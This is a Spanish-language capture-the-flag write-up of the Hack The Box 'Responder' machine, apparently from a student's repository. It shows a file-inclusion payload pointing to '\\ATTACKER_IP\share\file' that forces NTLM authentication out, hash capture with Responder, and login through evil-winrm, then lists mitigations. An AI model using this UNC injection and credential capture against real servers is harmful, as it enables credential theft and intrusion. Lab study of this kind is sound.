# Hack The Box - Responder

## Información básica
- Plataforma: Hack The Box
- Dificultad: Very Easy
- Sistema operativo: Windows
- Vector principal: Captura de NTLM (Responder) + acceso remoto por WinRM

---

## Enumeración

La enumeración inicial se automatizó mediante un script propio en Python
(`enum_basic_v2.py`) para organizar resultados.

Se identificó un servicio web asociado al host `unika.htb` y un entorno
Windows (rutas tipo `C:\xampp\htdocs\...` observadas en errores de la aplicación).

---

## Vulnerabilidad: inclusión insegura + autenticación NTLM saliente

La aplicación web incluía contenido basado en un parámetro controlado por el usuario
(p. ej. `page=`). En sistemas Windows, suministrar una ruta UNC provoca que el servidor
intente acceder a un recurso SMB remoto:

- Ruta UNC: `\\ATTACKER_IP\share\file`
- Esto fuerza al servidor Windows a iniciar una conexión SMB saliente.

Como consecuencia, el servidor intenta autenticarse automáticamente mediante NTLM,
filtrando un intercambio NetNTLMv2 hacia el atacante.

---

## Captura del hash con Responder

Se ejecutó Responder en la interfaz de la VPN de HTB (`tun0`) para escuchar y suplantar
servicios (especialmente SMB) y capturar la autenticación NTLM del objetivo.

```bash
responder -I tun0 -dwv
```
Evidencia:

- El objetivo inició autenticación NTLM contra el atacante.

- Responder capturó un hash NetNTLMv2 del usuario Administrator.

Nota: se omite el hash completo en el repositorio público.

---

## Acceso remoto (WinRM)

Con credenciales válidas, se accedió al sistema mediante WinRM usando Evil-WinRM,
obteniendo una shell remota en el host Windows.
```bash
evil-winrm -i IP -u administrator -p <PASSWORD>
```
### Obtención de la flag

Se localizó el archivo flag.txt mediante PowerShell:
```bash
Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt"
```

---

## Mitigación (visión ASIR)

Recomendaciones para evitar este tipo de compromiso:

- Deshabilitar LLMNR y NBT-NS en entornos Windows (políticas de grupo).

- Restringir tráfico saliente SMB/NTLM hacia redes no confiables (firewall/egress filtering).

- Evitar que aplicaciones web permitan rutas arbitrarias en include() y validar estrictamente entradas.

- Aplicar el principio de mínimo privilegio a los servicios web (evitar que corran como cuentas privilegiadas).

- Monitorizar eventos de autenticación NTLM anómalos y conexiones SMB salientes no esperadas.
